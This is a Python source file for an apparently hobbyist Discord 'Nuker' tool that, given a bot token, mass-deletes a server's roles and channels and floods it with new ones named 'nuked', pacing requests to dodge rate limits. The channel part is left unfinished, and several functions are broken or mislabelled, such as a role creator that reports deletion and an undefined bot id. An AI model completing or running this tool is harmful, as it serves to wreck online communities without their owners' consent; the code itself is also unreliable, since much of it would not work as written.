import asyncio
import aiohttp
import time
import random
import logging
import sys

class ColorFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': '\033[32m',  # green
        'INFO': '\033[36m',  # cyan
        'WARNING': '\033[33m',  # yellow
        'ERROR': '\033[31m',  # red
        'CRITICAL': '\033[41m',  # red background
    }

    RESET = '\033[0m'

    def format(self, record):
        color = self.COLORS.get(record.levelname, self.RESET)
        return f'{record.asctime} {color}{record.levelname}:{record.message}{self.RESET}'


logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

# Add a handler to the logger
handler = logging.StreamHandler()
logger.addHandler(handler)

# Create formatter
formatter = logging.Formatter("%(asctime)s\033[0m %(levelname)s:\033[1;37m %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

# Add the formatter to the handler
handler.setFormatter(formatter)

class Nuker:
    error_messages = {
        "NO_TOKEN": "No token provided",
        "INVALID_TOKEN": "Invalid token",
        "INVALID_ARG": "Invalid argument given for {}",
        "NOT_VALID_SERVER": "Invalid server id or bot is not in the server"
    }

    def __init__(self, token=None, anti_ratelimit=False, role_name:str="nuked", channel_name:str="nuked"):
        if token is None:
            raise Exception(self.error_messages["NO_TOKEN"])
        if not asyncio.run(self.validate_token(token)):
            raise Exception(self.error_messages["INVALID_TOKEN"])
        if anti_ratelimit is not True and anti_ratelimit is not False:
            raise Exception(self.error_messages["INVALID_TOKEN"].format("anti_ratelimit"))
        else:
            self.token = token
            self.role_name = role_name
            self.channel_name = channel_name
            if anti_ratelimit:
                self.anti_ratelimit = Nuker.TokenBucket(50, 50)
                self.anti_ratelimit_bool = True
            else:
                self.anti_ratelimit = Nuker.TokenBucket(0, 0)
                self.anti_ratelimit_bool = False
            logger.log(f"Bot successfully set up")
            
    def info(self) -> dict:
            infos = {
                "TOKEN": self.token,
                "anti_ratelimit": self.anti_ratelimit_bool,
                "Role name": self.role_name,
                "Channel name": self.channel_name
            }
            return infos
        
    async def validate_token(self, token: str) -> bool:
        url = f"https://discordapp.com/api/v6/users/@me"
        headers = {
            "Authorization": f"Bot {token}"
        }

        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as resp:
                return resp.status == 200
    
    async def is_bot_in_guild(self, guild_id: int) -> bool:
        url = f"https://discordapp.com/api/v6/guilds/{guild_id}"
        headers = {
            "Authorization": f"Bot {self.token}"
        }

        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return self.bot_id in [member["user"]["id"] for member in data["members"]]
                else:
                    return False

    class TokenBucket:
     def __init__(self, bucket_size, refill_rate):
        self.bucket_size = bucket_size
        self.refill_rate = refill_rate
        self.tokens = bucket_size
        self.last_refill = 0

     async def make_requests(self, num_requests):
        if self.refill_rate == 0:
            self.tokens = 0
            return True
        
        if self.tokens >= num_requests:
            self.tokens -= num_requests
            return True
        else:
            logging.warning("Max requests/s hit")
            now = time.time()
            wait_time = (num_requests - self.tokens) / self.refill_rate - (now - self.last_refill)
            if wait_time > 0:
                await asyncio.sleep(wait_time)
            self.tokens = self.bucket_size
            self.last_refill = time.time()
            self.tokens -= num_requests
            return True
    
    async def role_get_roles(self, guild_id):
       headers = {"Authorization": f"Bot {self.token}", "Content-Type": "application/json"}
       async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{guild_id}/roles", headers=headers) as response:
            if response.status == 200:
                roles = await response.json()
                role_ids = [role["id"] for role in roles]
                return role_ids, True
            else:
                return "Error getting role list:", response.status, response.reason, False

    async def role_create(self, guild_id):
       if await self.anti_ratelimit.make_requests(1):
        headers = {"authorization": f"Bot {self.token}"}
        data = {"name": self.role_name}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{guild_id}/roles", headers=headers, json=data) as response:
                if response.status == 200:
                  return "Role deleted successfully", True
                else:
                 return "Failed to delete role", response.status, response.reason, False
   
    async def role_delete(self, guild_id, role_id):
       if await self.anti_ratelimit.make_requests(1):
        headers = {"authorization": f"Bot {self.token}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/guilds/{guild_id}/roles/{role_id}", headers=headers) as response:
                if response.status == 204:
                    return "Role deleted successfully", True
                else:
                    return "Failed to delete role", response.status, response.reason, False
    
    async def role_auto(self, guild_id: int, method: str, amount:int=0):
        if method != "delete" and method != "create":
            raise Exception(self.error_messages["INVALID_ARG"].format("method"))
        if not await self.is_bot_in_guild(guild_id):
            raise Exception(self.error_messages["NOT_VALID_SERVER"])
        else:
            logging.info(f"Starting auto role {method}r process")
            tasks = []
            if method == "delete":
                roles = await self.role_get_roles(guild_id)
                while len(roles) > 0:
                    role_id = random.choice(roles)
                    roles.remove(role_id)
                    task = asyncio.create_task(self.role_delete(guild_id, role_id))
                    tasks.append(task)
            elif method == "create":
                for i in range(amount):
                    task = asyncio.create_task(self.role_create(guild_id))
                    tasks.append(task)
            result = await asyncio.gather(*tasks)
            return result
    
    async def channel_get_channels(self, guild_id):
     headers = {"authorization": f"Bot {self.token}"}
     async with aiohttp.ClientSession() as session:
        async with session.get(f"https://discordapp.com/api/v6/guilds/{guild_id}/channels", headers=headers) as response:
            if response.status == 200:
                guild_info = await response.json()
                num_channels = guild_info
                return num_channels, True
            else:
                return "Error getting number of channels:", response.status, response.reason, False
    
    async def channel_delete(self, channel_id):
        headers = {"authorization": f"Bot {self.token}"}
        async with aiohttp.ClientSession() as session:
            async with session.delete(f"https://discordapp.com/api/v6/channels/{channel_id}", headers=headers) as response:
                if response.status == 200:
                    return "Channel deleted successfully", True
                else:
                    return "Failed to delete channel", response.status, response.reason, False
    
    async def channel_create(self, guild_id):
        headers = {"authorization": f"Bot {self.token}"}
        data = {"name": self.channel_name, "type": 0}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discordapp.com/api/v6/guilds/{guild_id}/channels", headers=headers, json=data) as response:
                if response.status == 201:
                    return "Channel created successfully", True
                else:
                    return "Failed to create channel", response.status, response.reason, False
    
    async def auto_channels(self, guild_id: int, method:str, amount:int=0):
        if method != "delete" and method != "create":
            raise Exception(self.error_messages["INVALID_ARG"].format("method"))
        if not await self.is_bot_in_guild(guild_id):
            raise Exception(self.error_messages["NOT_VALID_SERVER"])
        else:
            pass # stopped working on it cus it was boring

    
instance = Nuker("", anti_ratelimit=True)
print(instance.info())
